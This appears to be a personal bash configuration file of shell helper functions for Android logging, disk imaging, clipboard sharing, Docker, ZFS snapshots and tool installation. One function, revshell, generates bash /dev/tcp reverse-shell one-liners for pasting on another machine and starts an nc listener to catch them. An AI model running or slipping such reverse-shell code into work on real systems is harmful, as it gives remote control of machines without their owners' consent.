#!/usr/bin/env bash

# Utils
md(){ command mkdir -p "$@" && cd "$1"; }
winvm () {
    ~/bin/winvm $1 &
}

adblog(){
    adb devices | tail -n +2 | cut -f1 | xargs -P0 -I{} adb -s {} logcat | stdbuf -oL grep $@ | cut -d" " -f2,6-
}

ddusb(){
    local vara=$1
    local varb=$2
    shift 2
    sudo dd bs=4M if="$vara" of="$varb" status=progress oflag=sync $@
}
mipsl(){
    ip addr |  awk '/inet6.*global/{print substr($2,1,length($2)-3)}'
}

clipic(){
    xclip -selection clipboard -t image/png <(convert $1 png:-)
}

#Command

vpn(){
    local name=$(~/bin/vpnfilter | tail -n1 | awk '{print $3}')
    command sudo openvpn "$VPNDIR"/"$name"
}

clipshare(){
    filename=clipshare
    xclip -selection clipboard -o >| /tmp/"$filename"

    ext=$(grep "$(file -b --mime-type /tmp/"$filename")" /etc/mime.types | awk '{print $2}')
    ext="${ext:+.}${ext}"
    hash=$(md5sum /tmp/"$filename" | cut -d" " -f1)

    scp -q /tmp/"$filename" vps:public/files/"$hash$ext"
    uri="https://alkeryn.com/$hash$ext"
    echo -n $uri | xclip -selection clipboard
    echo $uri
}

xev(){
command -p xev | awk -F'[ )]+' '/^KeyPress/ { a[NR+2] } NR in a { printf "%-3s %s\n", $5, $8 }'
}

dockerpull(){
mkdir -p $2
docker pull $1
docker export "$(docker create --name $(basename "$2"temp) $1 true)" | tar -x -C $2
docker rm $(basename "$2"temp)
}

gitforce(){
echo -n Are you sure \?
read
git add . && git commit --amend --date=$(date --iso-8601=seconds) && git push --force
}
getname(){
#Get classname of a windows
local NAME=`xprop | grep "^WM_CLASS"`
echo $NAME
echo $NAME | awk '{print "Name: " $4}'
}

small(){
    [[ $# < 2 ]] && return 1
    local much=$1 a=$2 b
    [[ $# == 2 ]] && { b=$a;shift 2; } || { b=$3;shift 3; }
    convert -resize $much $a $b
}

wifidb(){
while true
do
echo `cat /proc/net/wireless | awk '{print $4}' | tail -n 1 | cut -d '.' -f1 ;sleep 0.01` dBm
done
}

waifu2x-converter-cpp(){
grep -q "^ID=nixos" /etc/os-release && {
    export LD_LIBRARY_PATH=$(bash -c "source ~/bin/utils/findl;findlib64 *ocl-icd*"):$LD_LIBRARY_PATH; }
command waifu2x-converter-cpp $@
}

waifu(){
    [[ $# < 2 ]] && { waifu2x-converter-cpp; return 1; }
    local algo=$1 a=$2 b
    [[ $# == 2 ]] && { b=$a;shift 2; } || { b=$3;shift 3; }
    waifu2x-converter-cpp -m $algo -i "$a" -o "$b" $@
}
wnoise(){
    waifu noise $@
}
wscale(){
    waifu scale $@
}

vich(){
    su -pc "chattr -i $@;nvim $@;chattr +i $@"
}

revshell(){
local port
[[ -z "$1" ]] && port=8080 || port="$1"
local command="bash -c \"bash -i &> /dev/tcp/$(mip)/"$port" 0>&1\""
local command2="bash -c \"exec 3<>/dev/tcp/$(mip)/$port;echo \$(hostid)>&3;bash -i 0>&3 1>&3 2>&3\"" #command to send on the computer to access
echo $command
echo $command2
echo -n $command | xclip -selection clipboard
local rows=$(stty -a | cut -d";" -f2 | cut -d" " -f3 | head -n1)
local columns=$(stty -a | cut -d";" -f3 | cut -d" " -f3 | head -n1)

stty raw -echo
(
printf "
exec script -q /dev/null
stty rows $rows cols $columns
clear
";cat) | nc -l $port

stty sane
}

ydlmusic(){
    cd ~/Music/Musiques/Autres/Youtube
    youtube-dl --playlist-reverse -f bestaudio --add-metadata --download-archive list.txt -cio '%(playlist_index)s-%(id)s %(title)s.%(ext)s' https://www.youtube.com/playlist\?list\=PLtuQ0P--dLnwb78V9LdEy0DAFGvZKfMnt 2>> errors.log
    cd -
}

__mpdswap() {
    playlist=$(mpc playlist -f %file%)
    N=$(nl -w1 -s" " <<<"$playlist" | grep "$(head -n1 <<<"$playlist")" | tail -n1 | cut -d" " -f1)
    mpc mv 1 "$N"
    mpc del $((N-1))
}

mpdswap(){ # update current playlist
    (mpc update;mpc idle update) >/dev/null

    directory="$(dirname "$(mpc current -f %file%)")"
    mpc crop
    mpc ls "$directory" | tac | mpc add

    __mpdswap
}

mpdfilesort(){
    playlist=$(mpc playlist -f %file% | sort)
    mpc crop
    mpc add <<<"$playlist"

    __mpdswap
}

wolpc(){
wol -p 999 -i alkeryn.freeboxos.fr 70:85:c2:5a:0c:0b
}

# Installs

antigen-install(){
curl -sLo ~/.zsh/antigen.zsh --create-dirs --proto-redir -all,https \
    git.io/antigen
}

vimplug-install(){
curl -sLo ~/.local/share/nvim/site/autoload/plug.vim --create-dirs \
    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
pip2 install --user neovim
pip3 install --user neovim
npm install --user neovim
rm -f ~/package-lock.json
}

gef-install(){
curl -sLo ~/.local/share/gdb/gef.py --create-dirs \
    https://github.com/hugsy/gef/raw/master/gef.py
pip2 install --user capstone unicorn keystone-engine ropper
pip3 install --user capstone unicorn keystone-engine ropper
}

rice-install(){
mkdir -p .config/etc
antigen-install
vimplug-install
gef-install
pip install --user ueberzug
}

# ~~~~~~~~~~~~~~~~~~~~

zsnap () {
(
zsnap(){
    sudo zfs snapshot "$1"@$(date +%Y%m%d_%H%M%S)
    while [ $(zfs list -t snapshot -H -r "$1" | wc -l) -gt 3 ]
    do
	sudo zfs destroy $(zfs list -t snapshot -s creation -o name -H -r "$1" | head -n1)
    done
}
$mainpc && zsnap stock/stock/Media

for i in $(zfs list -Hro name linux/root | tail -n +2)
do
    zsnap $i
done

zsnap linux/data/home

)
}
